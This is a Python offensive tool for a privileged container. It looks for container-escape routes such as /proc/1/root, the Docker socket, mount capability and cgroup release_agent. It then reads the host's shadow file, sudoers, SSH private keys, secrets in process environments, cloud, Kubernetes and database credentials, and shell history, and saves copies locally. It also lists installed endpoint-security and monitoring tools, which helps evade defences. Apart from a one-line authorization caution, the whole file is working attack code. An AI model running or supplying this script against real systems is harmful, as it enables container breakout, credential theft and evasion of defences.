#!/usr/bin/env python3
"""
Host Access Reconnaissance Tool
------------------------------
This script attempts to access the host system from a privileged container
and performs reconnaissance on the host environment.

CAUTION: Use only in authorized security testing environments.
"""

import os
import sys
import subprocess
import json
import socket
import pwd
import grp
import time
from datetime import datetime
from pathlib import Path


class HostRecon:
    def __init__(self):
        self.findings = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "hostname": socket.gethostname(),
            "host_access_methods": {},
            "host_system_info": {},
            "host_processes": {},
            "host_users": {},
            "host_network": {},
            "host_files": {},
            "security_tools": {},
            "cloud_environment": {},
            "credentials": {}
        }
        
        # Create results directory
        os.makedirs("host_recon_results", exist_ok=True)
        
    def run_command(self, command, timeout=10):
        """Run a shell command and return its output."""
        try:
            result = subprocess.run(
                command, 
                shell=True, 
                check=False,
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                text=True,
                timeout=timeout
            )
            return result.stdout.strip()
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def find_escape_methods(self):
        """Identify available escape methods based on container configuration."""
        print("[+] Identifying available escape methods...")
        
        escape_methods = {}
        
        # Check for /proc/1/root access (most direct method)
        host_proc_accessible = os.access("/proc/1/root", os.R_OK)
        escape_methods["proc_1_root_access"] = host_proc_accessible
        
        # Check for CAP_SYS_ADMIN capability
        cap_sys_admin = "cap_sys_admin" in self.run_command("capsh --print").lower()
        escape_methods["cap_sys_admin"] = cap_sys_admin
        
        # Check if we can mount filesystems
        can_mount = os.access("/dev", os.W_OK) and cap_sys_admin
        escape_methods["can_mount_filesystems"] = can_mount
        
        # Check for device access that could be used for escapes
        device_access = {
            "dev_mem": os.access("/dev/mem", os.W_OK),
            "dev_kmem": os.access("/dev/kmem", os.W_OK),
            "dev_port": os.access("/dev/port", os.W_OK),
            "proc_kcore": os.access("/proc/kcore", os.R_OK),
            "dev_kvm": os.access("/dev/kvm", os.W_OK),
        }
        escape_methods["device_access"] = device_access
        
        # Check for cgroup release_agent escape
        cgroup_escape = False
        cgroup_dirs = [
            "/sys/fs/cgroup/memory",
            "/sys/fs/cgroup/freezer",
            "/sys/fs/cgroup/cpu",
        ]
        
        for cgroup_dir in cgroup_dirs:
            if os.path.exists(f"{cgroup_dir}/release_agent") and os.access(f"{cgroup_dir}/release_agent", os.W_OK):
                cgroup_escape = True
                break
                
        escape_methods["cgroup_release_agent_escape"] = cgroup_escape
        
        # Check for docker socket
        docker_socket_access = os.path.exists("/var/run/docker.sock") and os.access("/var/run/docker.sock", os.R_OK)
        escape_methods["docker_socket_access"] = docker_socket_access
        
        self.findings["host_access_methods"] = escape_methods
        
        # Determine best escape method
        if host_proc_accessible:
            self.best_escape_method = "proc_1_root"
            print("[+] Will use /proc/1/root to access host filesystem")
        elif docker_socket_access:
            self.best_escape_method = "docker_socket"
            print("[+] Will use Docker socket to access host")
        elif can_mount:
            self.best_escape_method = "mount"
            print("[+] Will use mounting capabilities to access host")
        elif cgroup_escape:
            self.best_escape_method = "cgroup"
            print("[+] Will use cgroup release_agent method")
        else:
            self.best_escape_method = None
            print("[-] No straightforward escape method found")
            
        return self.best_escape_method is not None
    
    def access_host_filesystem(self):
        """Access the host filesystem using the identified method."""
        print("[+] Attempting to access host filesystem...")
        
        host_fs_path = None
        
        if self.best_escape_method == "proc_1_root":
            # Direct access via /proc/1/root
            host_fs_path = "/proc/1/root"
            
        elif self.best_escape_method == "docker_socket":
            # This would normally involve creating a privileged container
            # For security reasons, we'll just check if it's possible
            print("[*] Docker socket access available, but not creating new containers in this script")
            print("[*] In a real attack, could create privileged container with host mounts")
            
        elif self.best_escape_method == "mount":
            # Create a temporary directory to mount
            os.makedirs("/tmp/host_root", exist_ok=True)
            
            # Attempt to mount the host root filesystem
            # This is just a demonstration - in real security testing would need more controls
            mount_result = self.run_command("mount -t proc none /tmp/host_root")
            
            if "Error" not in mount_result:
                host_fs_path = "/tmp/host_root"
            
        elif self.best_escape_method == "cgroup":
            print("[*] Cgroup release_agent method identified but not executed")
            print("[*] This would involve creating a custom cgroup and manipulating the release_agent")
            
        if host_fs_path and os.path.exists(host_fs_path) and os.access(host_fs_path, os.R_OK):
            print(f"[+] Successfully accessed host filesystem at {host_fs_path}")
            self.host_fs_path = host_fs_path
            return True
        else:
            print("[-] Failed to access host filesystem")
            self.host_fs_path = None
            return False
    
    def gather_host_system_info(self):
        """Gather information about the host system."""
        print("[+] Gathering host system information...")
        
        if not hasattr(self, 'host_fs_path') or not self.host_fs_path:
            print("[-] No access to host filesystem, skipping host system info gathering")
            return
            
        host_path = self.host_fs_path
        
        # Read key files from host
        os_release = self.run_command(f"cat {host_path}/etc/os-release")
        hostname = self.run_command(f"cat {host_path}/etc/hostname")
        kernel = self.run_command(f"cat {host_path}/proc/version")
        
        # Collect system information
        self.findings["host_system_info"] = {
            "hostname": hostname,
            "os_release": os_release,
            "kernel": kernel,
            "uptime": self.run_command(f"cat {host_path}/proc/uptime"),
            "loaded_modules": self.run_command(f"ls -la {host_path}/proc/1/maps | head -10")
        }
        
        # Extract key system directories
        important_dirs = [
            "/etc", "/var/log", "/root", "/home", 
            "/var/lib/docker", "/var/lib/kubelet",
            "/opt", "/usr/local/bin"
        ]
        
        for dir_path in important_dirs:
            full_path = f"{host_path}{dir_path}"
            if os.path.exists(full_path):
                dir_listing = self.run_command(f"ls -la {full_path} | head -20")
                self.findings["host_system_info"][f"{dir_path}_listing"] = dir_listing
    
    def gather_host_processes(self):
        """Gather information about running processes on the host."""
        print("[+] Gathering host process information...")
        
        if not hasattr(self, 'host_fs_path') or not self.host_fs_path:
            print("[-] No access to host filesystem, skipping host process gathering")
            return
            
        host_path = self.host_fs_path
        
        # Get a list of processes from the host
        processes = {}
        proc_dir = f"{host_path}/proc"
        
        if os.path.exists(proc_dir) and os.access(proc_dir, os.R_OK):
            try:
                for pid in os.listdir(proc_dir):
                    if pid.isdigit():
                        cmd_file = f"{proc_dir}/{pid}/cmdline"
                        environ_file = f"{proc_dir}/{pid}/environ"
                        status_file = f"{proc_dir}/{pid}/status"
                        
                        if os.path.exists(cmd_file) and os.access(cmd_file, os.R_OK):
                            with open(cmd_file, 'r') as f:
                                try:
                                    cmd = f.read().replace('\0', ' ').strip()
                                    if cmd:  # Only include processes with a command
                                        processes[pid] = {"command": cmd}
                                        
                                        # Get process owner
                                        if os.path.exists(status_file) and os.access(status_file, os.R_OK):
                                            with open(status_file, 'r') as sf:
                                                status_content = sf.read()
                                                for line in status_content.splitlines():
                                                    if line.startswith("Uid:"):
                                                        processes[pid]["uid"] = line.split()[1]
                                                    if line.startswith("Name:"):
                                                        processes[pid]["name"] = line.split()[1]
                                        
                                        # Check for interesting environment variables
                                        if os.path.exists(environ_file) and os.access(environ_file, os.R_OK):
                                            with open(environ_file, 'r') as ef:
                                                try:
                                                    env = ef.read().replace('\0', '\n').strip()
                                                    interesting_vars = ["SECRET", "KEY", "TOKEN", "PASSWORD", "PASS", "AWS", "KUBE", "DOCKER"]
                                                    for line in env.splitlines():
                                                        for var in interesting_vars:
                                                            if var in line.upper() and "=" in line:
                                                                if "env_vars" not in processes[pid]:
                                                                    processes[pid]["env_vars"] = []
                                                                processes[pid]["env_vars"].append(line)
                                                except:
                                                    pass
                                except:
                                    pass
            except Exception as e:
                print(f"[-] Error accessing processes: {str(e)}")
        
        # Filter for interesting processes
        interesting_processes = {}
        interesting_keywords = [
            "docker", "containerd", "kubelet", "kube", "etcd", "api", "supervisor",
            "ssh", "nginx", "apache", "postgres", "mysql", "mongo", "redis", "elasticsearch",
            "aws", "azure", "gcp", "cloud", "sshd", "httpd"
        ]
        
        for pid, info in processes.items():
            cmd = info.get("command", "").lower()
            name = info.get("name", "").lower()
            
            for keyword in interesting_keywords:
                if keyword in cmd or keyword in name:
                    interesting_processes[pid] = info
                    break
        
        self.findings["host_processes"] = {
            "process_count": len(processes),
            "interesting_processes": interesting_processes
        }
    
    def gather_host_users(self):
        """Gather information about users on the host system."""
        print("[+] Gathering host user information...")
        
        if not hasattr(self, 'host_fs_path') or not self.host_fs_path:
            print("[-] No access to host filesystem, skipping host user gathering")
            return
            
        host_path = self.host_fs_path
        
        # Read passwd and shadow files
        passwd_file = f"{host_path}/etc/passwd"
        shadow_file = f"{host_path}/etc/shadow"
        sudoers_file = f"{host_path}/etc/sudoers"
        
        users = {}
        
        if os.path.exists(passwd_file) and os.access(passwd_file, os.R_OK):
            with open(passwd_file, 'r') as f:
                passwd_content = f.read()
                
                for line in passwd_content.splitlines():
                    if line and not line.startswith('#'):
                        parts = line.split(':')
                        if len(parts) >= 7:
                            username = parts[0]
                            uid = parts[2]
                            gid = parts[3]
                            home = parts[5]
                            shell = parts[6]
                            
                            # Only include real users
                            if shell not in ['/sbin/nologin', '/usr/sbin/nologin', '/bin/false'] and int(uid) < 1000:
                                users[username] = {
                                    "uid": uid,
                                    "gid": gid,
                                    "home": home,
                                    "shell": shell
                                }
        
        # Check for shadow file access
        shadow_access = os.path.exists(shadow_file) and os.access(shadow_file, os.R_OK)
        
        if shadow_access:
            print("[!] Shadow file is readable!")
            with open(shadow_file, 'r') as f:
                shadow_content = f.read()
                for line in shadow_content.splitlines():
                    if line and not line.startswith('#'):
                        parts = line.split(':')
                        if len(parts) >= 2:
                            username = parts[0]
                            password_hash = parts[1]
                            
                            if username in users:
                                users[username]["password_hash"] = password_hash
                                
                                # Check if password is empty or weak
                                if password_hash in ['', '*', '!', 'x', '!!']:
                                    users[username]["password_status"] = "No password or locked"
                                else:
                                    users[username]["password_status"] = "Has password hash"
        
        # Check sudo permissions
        sudoers_content = None
        if os.path.exists(sudoers_file) and os.access(sudoers_file, os.R_OK):
            with open(sudoers_file, 'r') as f:
                sudoers_content = f.read()
        
        # Check for SSH keys
        for username, info in users.items():
            home_dir = info["home"]
            ssh_dir = f"{host_path}{home_dir}/.ssh"
            
            if os.path.exists(ssh_dir) and os.access(ssh_dir, os.R_OK):
                authorized_keys = f"{ssh_dir}/authorized_keys"
                id_rsa = f"{ssh_dir}/id_rsa"
                
                if os.path.exists(authorized_keys) and os.access(authorized_keys, os.R_OK):
                    with open(authorized_keys, 'r') as f:
                        users[username]["authorized_keys"] = f.read()
                
                if os.path.exists(id_rsa) and os.access(id_rsa, os.R_OK):
                    with open(id_rsa, 'r') as f:
                        users[username]["private_key"] = f.read()
                        print(f"[!] Found private SSH key for user {username}!")
        
        self.findings["host_users"] = {
            "users": users,
            "shadow_accessible": shadow_access,
            "sudoers_content": sudoers_content
        }
    
    def gather_host_network(self):
        """Gather network information from the host."""
        print("[+] Gathering host network information...")
        
        if not hasattr(self, 'host_fs_path') or not self.host_fs_path:
            print("[-] No access to host filesystem, skipping host network gathering")
            return
            
        host_path = self.host_fs_path
        
        # Check interfaces
        interfaces_file = f"{host_path}/proc/net/dev"
        
        if os.path.exists(interfaces_file) and os.access(interfaces_file, os.R_OK):
            with open(interfaces_file, 'r') as f:
                interfaces = f.read()
        else:
            interfaces = "Could not access interface information"
        
        # Check routing table
        route_file = f"{host_path}/proc/net/route"
        
        if os.path.exists(route_file) and os.access(route_file, os.R_OK):
            with open(route_file, 'r') as f:
                routes = f.read()
        else:
            routes = "Could not access routing information"
            
        # Check ARP table
        arp_file = f"{host_path}/proc/net/arp"
        
        if os.path.exists(arp_file) and os.access(arp_file, os.R_OK):
            with open(arp_file, 'r') as f:
                arp_table = f.read()
        else:
            arp_table = "Could not access ARP information"
            
        # Check open ports
        tcp_file = f"{host_path}/proc/net/tcp"
        tcp6_file = f"{host_path}/proc/net/tcp6"
        udp_file = f"{host_path}/proc/net/udp"
        udp6_file = f"{host_path}/proc/net/udp6"
        
        ports = {}
        
        for proto_file, proto_name in [(tcp_file, "tcp"), (tcp6_file, "tcp6"), 
                                      (udp_file, "udp"), (udp6_file, "udp6")]:
            if os.path.exists(proto_file) and os.access(proto_file, os.R_OK):
                with open(proto_file, 'r') as f:
                    ports[proto_name] = f.read()
            else:
                ports[proto_name] = f"Could not access {proto_name} information"
                
        # Read host files
        hosts_file = f"{host_path}/etc/hosts"
        
        if os.path.exists(hosts_file) and os.access(hosts_file, os.R_OK):
            with open(hosts_file, 'r') as f:
                hosts_content = f.read()
        else:
            hosts_content = "Could not access hosts file"
            
        # DNS configuration
        resolv_file = f"{host_path}/etc/resolv.conf"
        
        if os.path.exists(resolv_file) and os.access(resolv_file, os.R_OK):
            with open(resolv_file, 'r') as f:
                resolv_content = f.read()
        else:
            resolv_content = "Could not access resolv.conf"
            
        self.findings["host_network"] = {
            "interfaces": interfaces,
            "routes": routes,
            "arp_table": arp_table,
            "ports": ports,
            "hosts_file": hosts_content,
            "resolv_conf": resolv_content
        }
    
    def find_sensitive_files(self):
        """Look for sensitive files on the host system."""
        print("[+] Searching for sensitive files...")
        
        if not hasattr(self, 'host_fs_path') or not self.host_fs_path:
            print("[-] No access to host filesystem, skipping sensitive file search")
            return
            
        host_path = self.host_fs_path
        
        sensitive_files = {
            "kubernetes_config": [
                "/etc/kubernetes/admin.conf",
                "/etc/kubernetes/controller-manager.conf",
                "/etc/kubernetes/kubelet.conf",
                "/etc/kubernetes/scheduler.conf",
                "/var/lib/kubelet/kubeconfig",
                "/.kube/config",
                "/root/.kube/config"
            ],
            "docker_config": [
                "/root/.docker/config.json",
                "/home/*/.docker/config.json"
            ],
            "cloud_credentials": [
                "/root/.aws/credentials",
                "/home/*/.aws/credentials",
                "/root/.aws/config",
                "/root/.azure/credentials",
                "/root/.config/gcloud/credentials",
                "/.config/gcloud/application_default_credentials.json"
            ],
            "ssh_keys": [
                "/root/.ssh/id_rsa",
                "/home/*/.ssh/id_rsa",
                "/etc/ssh/ssh_host_rsa_key"
            ],
            "database_credentials": [
                "/etc/mysql/my.cnf",
                "/var/lib/mysql/.my.cnf",
                "/root/.my.cnf",
                "/etc/postgresql/*.conf",
                "/var/lib/postgresql/.pgpass",
                "/root/.pgpass"
            ],
            "application_configs": [
                "/opt/*/conf/*",
                "/etc/nginx/conf.d/*",
                "/etc/apache2/sites-enabled/*",
                "/etc/httpd/conf.d/*"
            ],
            "log_files": [
                "/var/log/auth.log",
                "/var/log/secure",
                "/var/log/audit/audit.log",
                "/var/log/syslog",
                "/var/log/messages",
                "/var/log/docker.log"
            ]
        }
        
        found_files = {}
        
        for category, file_paths in sensitive_files.items():
            found_files[category] = {}
            
            for file_path in file_paths:
                # Handle wildcards in the path
                if "*" in file_path:
                    base_dir = file_path.split("*")[0]
                    full_base_dir = f"{host_path}{base_dir}"
                    
                    if os.path.exists(full_base_dir) and os.access(full_base_dir, os.R_OK):
                        glob_results = list(Path(full_base_dir).glob("*"))
                        
                        for result in glob_results:
                            rel_path = str(result).replace(host_path, "")
                            if os.access(result, os.R_OK):
                                try:
                                    with open(result, 'r') as f:
                                        content = f.read()
                                        found_files[category][rel_path] = "File found and readable"
                                        
                                        # Save interesting files
                                        if any(keyword in rel_path.lower() for keyword in ["rsa", "key", "secret", "password", "credentials"]):
                                            output_path = f"host_recon_results/{rel_path.replace('/', '_')}"
                                            with open(output_path, 'w') as of:
                                                of.write(content)
                                except:
                                    found_files[category][rel_path] = "File found but could not read content"
                else:
                    full_path = f"{host_path}{file_path}"
                    if os.path.exists(full_path):
                        if os.access(full_path, os.R_OK):
                            try:
                                with open(full_path, 'r') as f:
                                    content = f.read()
                                    found_files[category][file_path] = "File found and readable"
                                    
                                    # Save interesting files
                                    if any(keyword in file_path.lower() for keyword in ["rsa", "key", "secret", "password", "credentials"]):
                                        output_path = f"host_recon_results/{file_path.replace('/', '_')}"
                                        with open(output_path, 'w') as of:
                                            of.write(content)
                            except:
                                found_files[category][file_path] = "File found but could not read content"
                        else:
                            found_files[category][file_path] = "File found but not readable"
        
        self.findings["host_files"] = found_files
    
    def check_for_security_tools(self):
        """Look for security tools and monitoring on the host."""
        print("[+] Checking for security tools...")
        
        if not hasattr(self, 'host_fs_path') or not self.host_fs_path:
            print("[-] No access to host filesystem, skipping security tool check")
            return
            
        host_path = self.host_fs_path
        
        security_tools = [
            # EDR/AV
            "crowdstrike", "falcon", "cb.exe", "carbon black", "symantec", "sep", "trendmicro", "mcafee",
            "sophos", "kaspersky", "cylance", "sentinelone", "eset", "defender", "xagt", "fireeye", 
            # SIEM/Logging
            "splunk", "elastic", "wazuh", "ossec", "auditd", "logstash", "filebeat", "syslog-ng", "rsyslog",
            # Container security
            "falco", "twistlock", "aqua", "sysdig", "seccomp", "apparmor", "selinux", "grsecurity", "prisma"
        ]
        
        found_tools = {}
        
        # Check directories where security tools might be installed
        check_dirs = [
            "/opt", "/usr/local/bin", "/usr/bin", "/usr/sbin", "/etc", 
            "/var/log", "/var/lib", "/usr/share"
        ]
        
        for directory in check_dirs:
            full_dir = f"{host_path}{directory}"
            if os.path.exists(full_dir) and os.access(full_dir, os.R_OK):
                try:
                    for root, dirs, files in os.walk(full_dir, topdown=True, followlinks=False):
                        # Limit depth to avoid too much recursion
                        if root.count('/') - full_dir.count('/') > 2:
                            continue
                            
                        for name in dirs + files:
                            for tool in security_tools:
                                if tool.lower() in name.lower():
                                    rel_path = os.path.join(root, name).replace(host_path, "")
                                    found_tools[rel_path] = tool
                except Exception as e:
                    print(f"[-] Error scanning {directory}: {str(e)}")
        
        # Check for running security processes
        if hasattr(self, 'findings') and "host_processes" in self.findings:
            for pid, info in self.findings["host_processes"].get("interesting_processes", {}).items():
                cmd = info.get("command", "").lower()
                name = info.get("name", "").lower()
                
                for tool in security_tools:
                    if tool.lower() in cmd or tool.lower() in name:
                        found_tools[f"process_{pid}"] = f"{name}: {cmd}"
        
        self.findings["security_tools"] = found_tools
    
    def check_for_cloud_environment(self):
        """Detect cloud environment details."""
        print("[+] Checking for cloud environment...")
        
        if not hasattr(self, 'host_fs_path') or not self.host_fs_path:
            print("[-] No access to host filesystem, skipping cloud environment check")
            return
            
        host_path = self.host_fs_path
        
        cloud_indicators = {
            "aws": [
                "/etc/amazon", 
                "/etc/aws", 
                "/etc/cloud/cloud.cfg",
                "/root/.aws",
                "/home/*/.aws",
                "/var/log/cloud-init.log"
            ],
            "gcp": [
                "/etc/google", 
                "/etc/google-cloud", 
                "/root/.config/gcloud",
                "/home/*/.config/gcloud"
            ],
            "azure": [
                "/var/lib/waagent", 
                "/etc/waagent.conf",
                "/root/.azure",
                "/home/*/.azure"
            ],
            "digitalocean": [
                "/etc/digitalocean"
            ]
        }
        
        found_indicators = {}
        
        for cloud, indicators in cloud_indicators.items():
            found_indicators[cloud] = []
            
            for indicator in indicators:
                if "*" in indicator:
                    base_dir = indicator.split("*")[0]
                    full_base_dir = f"{host_path}{base_dir}"
                    
                    if os.path.exists(full_base_dir) and os.access(full_base_dir, os.R_OK):
                        glob_results = list(Path(full_base_dir).glob("*"))
                        
                        for result in glob_results:
                            rel_path = str(result).replace(host_path, "")
                            if os.path.exists(result):
                                found_indicators[cloud].append(rel_path)
                else:
                    full_path = f"{host_path}{indicator}"
                    if os.path.exists(full_path):
                        found_indicators[cloud].append(indicator)
        
        # Check for cloud metadata service
        cloud_metadata = {}
        
        aws_metadata_file = f"{host_path}/var/lib/cloud/instance/user-data.txt"
        if os.path.exists(aws_metadata_file) and os.access(aws_metadata_file, os.R_OK):
            with open(aws_metadata_file, 'r') as f:
                cloud_metadata["aws_user_data"] = f.read()
                
        self.findings["cloud_environment"] = {
            "cloud_indicators": found_indicators,
            "cloud_metadata": cloud_metadata
        }
        
        # Determine which cloud we're in
        for cloud, indicators in found_indicators.items():
            if indicators:
                print(f"[!] Detected {cloud.upper()} cloud environment")
    
    def find_credentials(self):
        """Look for credentials and secrets on the host."""
        print("[+] Looking for credentials and secrets...")
        
        if not hasattr(self, 'host_fs_path') or not self.host_fs_path:
            print("[-] No access to host filesystem, skipping credentials search")
            return
            
        host_path = self.host_fs_path
        
        # Keywords indicating potential credentials
        credential_keywords = [
            "password", "passwd", "pass", "pwd", "secret", "key", "token", "api", "auth", 
            "login", "cred", "cert", "id", "account", "secure", "private", "confidential"
        ]
        
        # Files/locations likely to contain credentials
        credential_locations = [
            # Configuration files
            "/etc/passwd",
            "/etc/shadow",
            "/etc/secrets",
            "/etc/kubernetes/*",
            "/var/lib/kubelet/config.yaml",
            "/root/.kube/config",
            "/root/.docker/config.json",
            # Cloud credentials
            "/root/.aws/credentials",
            "/root/.aws/config",
            "/root/.azure/credentials",
            "/root/.config/gcloud",
            # Home directories
            "/root/.bash_history",
            "/home/*/.bash_history",
            "/root/.ssh/id_rsa",
            "/home/*/.ssh/id_rsa",
            # Application configs
            "/opt/*/conf/*",
            "/etc/nginx/conf.d/*",
            "/etc/apache2/sites-enabled/*",
            "/var/www/html/*.conf",
            "/var/www/html/*.php",
            "/var/www/html/*.js",
            # Database configs
            "/etc/mysql/my.cnf",
            "/var/lib/mysql/.my.cnf",
            "/root/.my.cnf",
            "/etc/postgresql/*.conf",
            "/var/lib/postgresql/.pgpass",
            # Git repos
            "/var/www/*/.git/config",
            "/home/*/.gitconfig",
            # Environment files
            "/*/.env",
            "/*/.env.prod",
            "/*/.env.production",
            "/*/env.yml",
            "/*/config.yml"
        ]
        
        found_credentials = {}
        
        # Search for credentials in specific locations
        for location in credential_locations:
            if "*" in location:
                base_dir = location.split("*")[0]
                full_base_dir = f"{host_path}{base_dir}"
                
                if os.path.exists(full_base_dir) and os.access(full_base_dir, os.R_OK):
                    try:
                        glob_results = list(Path(full_base_dir).glob("*" + location.split("*")[1]))
                        
                        for result in glob_results:
                            rel_path = str(result).replace(host_path, "")
                            try:
                                if os.path.isfile(result) and os.access(result, os.R_OK):
                                    with open(result, 'r') as f:
                                        content = f.read()
                                        
                                    # Search for credential patterns in the file
                                    for keyword in credential_keywords:
                                        if keyword.lower() in content.lower():
                                            # Extract lines containing the keyword
                                            for line in content.splitlines():
                                                if keyword.lower() in line.lower():
                                                    if rel_path not in found_credentials:
                                                        found_credentials[rel_path] = []
                                                    found_credentials[rel_path].append(line.strip())
                                            
                                            # Save the file for later analysis
                                            output_path = f"host_recon_results/{rel_path.replace('/', '_')}"
                                            with open(output_path, 'w') as of:
                                                of.write(content)
                            except Exception as e:
                                print(f"[-] Error processing {rel_path}: {str(e)}")
                    except Exception as e:
                        print(f"[-] Error processing glob {location}: {str(e)}")
            else:
                full_path = f"{host_path}{location}"
                if os.path.exists(full_path) and os.path.isfile(full_path) and os.access(full_path, os.R_OK):
                    try:
                        with open(full_path, 'r') as f:
                            content = f.read()
                            
                        # Search for credential patterns in the file
                        for keyword in credential_keywords:
                            if keyword.lower() in content.lower():
                                # Extract lines containing the keyword
                                for line in content.splitlines():
                                    if keyword.lower() in line.lower():
                                        if location not in found_credentials:
                                            found_credentials[location] = []
                                        found_credentials[location].append(line.strip())
                                
                                # Save the file for later analysis
                                output_path = f"host_recon_results/{location.replace('/', '_')}"
                                with open(output_path, 'w') as of:
                                    of.write(content)
                    except Exception as e:
                        print(f"[-] Error processing {location}: {str(e)}")
        
        # Search for environment variables in process environments
        if hasattr(self, 'findings') and "host_processes" in self.findings:
            env_credentials = {}
            
            for pid, info in self.findings["host_processes"].get("interesting_processes", {}).items():
                if "env_vars" in info:
                    for env_var in info["env_vars"]:
                        for keyword in credential_keywords:
                            if keyword.lower() in env_var.lower():
                                if f"process_{pid}" not in env_credentials:
                                    env_credentials[f"process_{pid}"] = []
                                env_credentials[f"process_{pid}"].append(env_var)
            
            found_credentials["process_environment_variables"] = env_credentials
        
        self.findings["credentials"] = found_credentials
    
    def save_findings(self):
        """Save findings to a JSON file."""
        print("[+] Saving reconnaissance results...")
        
        filename = f"host_recon_results/host_recon_{socket.gethostname()}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        try:
            with open(filename, 'w') as f:
                json.dump(self.findings, f, indent=2)
            print(f"[+] Results saved to {filename}")
        except Exception as e:
            print(f"[-] Failed to save results: {str(e)}")
            print("[+] Printing summary to stdout instead:")
            print(json.dumps(self.findings, indent=2))
    
    def print_summary(self):
        """Print a summary of findings."""
        print("\n=== HOST RECONNAISSANCE SUMMARY ===")
        
        # Host access method
        if hasattr(self, 'best_escape_method') and self.best_escape_method:
            print(f"[+] Host access method: {self.best_escape_method}")
            
            if hasattr(self, 'host_fs_path') and self.host_fs_path:
                print(f"[+] Host filesystem accessed at: {self.host_fs_path}")
            else:
                print("[-] Failed to access host filesystem")
        else:
            print("[-] No escape method identified")
            
        # System info
        if "host_system_info" in self.findings and self.findings["host_system_info"]:
            hostname = self.findings["host_system_info"].get("hostname", "Unknown")
            os_release = self.findings["host_system_info"].get("os_release", "Unknown")
            kernel = self.findings["host_system_info"].get("kernel", "Unknown")
            
            print(f"[+] Host hostname: {hostname}")
            print(f"[+] OS: {os_release.split('PRETTY_NAME=')[1].strip('"') if 'PRETTY_NAME=' in os_release else os_release}")            
            print(f"[+] Kernel: {kernel}")
            
        # Users
        if "host_users" in self.findings and self.findings["host_users"]:
            users = self.findings["host_users"].get("users", {})
            print(f"[+] Found {len(users)} users with real shells")
            
            if self.findings["host_users"].get("shadow_accessible", False):
                print("[!] Shadow file is readable! Password hashes may be extracted")
                
            for username, info in users.items():
                if "private_key" in info:
                    print(f"[!] Found private SSH key for user {username}")
        
        # Network
        if "host_network" in self.findings and self.findings["host_network"]:
            if "ports" in self.findings["host_network"]:
                tcp_ports = self.findings["host_network"]["ports"].get("tcp", "").count("\n")
                print(f"[+] Found approximately {tcp_ports} open TCP ports")
                
        # Security tools
        if "security_tools" in self.findings and self.findings["security_tools"]:
            print(f"[+] Detected {len(self.findings['security_tools'])} security tools/indicators")
            for path, tool in list(self.findings["security_tools"].items())[:5]:
                print(f"    - {tool} at {path}")
            if len(self.findings["security_tools"]) > 5:
                print(f"    - ... and {len(self.findings['security_tools']) - 5} more")
                
        # Cloud environment
        if "cloud_environment" in self.findings and self.findings["cloud_environment"]:
            for cloud, indicators in self.findings["cloud_environment"]["cloud_indicators"].items():
                if indicators:
                    print(f"[+] Detected {cloud.upper()} cloud environment ({len(indicators)} indicators)")
        
        # Credentials
        if "credentials" in self.findings and self.findings["credentials"]:
            print(f"[+] Found potential credentials in {len(self.findings['credentials'])} locations")
            for location, creds in list(self.findings["credentials"].items())[:3]:
                if isinstance(creds, list):
                    print(f"    - {location}: {len(creds)} potential credential strings")
                elif isinstance(creds, dict):
                    print(f"    - {location}: {len(creds)} entries")
            if len(self.findings["credentials"]) > 3:
                print(f"    - ... and {len(self.findings['credentials']) - 3} more locations")
        
        print("=============================================")
        print("[+] Full results saved to host_recon_results/")
        print("[+] Check this directory for extracted sensitive files")
        print("=============================================")
    
    def run(self):
        """Run the host reconnaissance."""
        print("==== Host Access Reconnaissance Tool ====")
        print(f"Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Hostname: {socket.gethostname()}")
        print("=============================================")
        
        # Find escape methods
        if not self.find_escape_methods():
            print("[-] No suitable escape methods found")
            return
        
        # Try to access host filesystem
        if not self.access_host_filesystem():
            print("[-] Failed to access host filesystem")
            return
        
        # Gather host information
        self.gather_host_system_info()
        self.gather_host_processes()
        self.gather_host_users()
        self.gather_host_network()
        self.find_sensitive_files()
        self.check_for_security_tools()
        self.check_for_cloud_environment()
        self.find_credentials()
        
        # Save results
        self.save_findings()
        
        # Print summary
        self.print_summary()


if __name__ == "__main__":
    recon = HostRecon()
    recon.run()
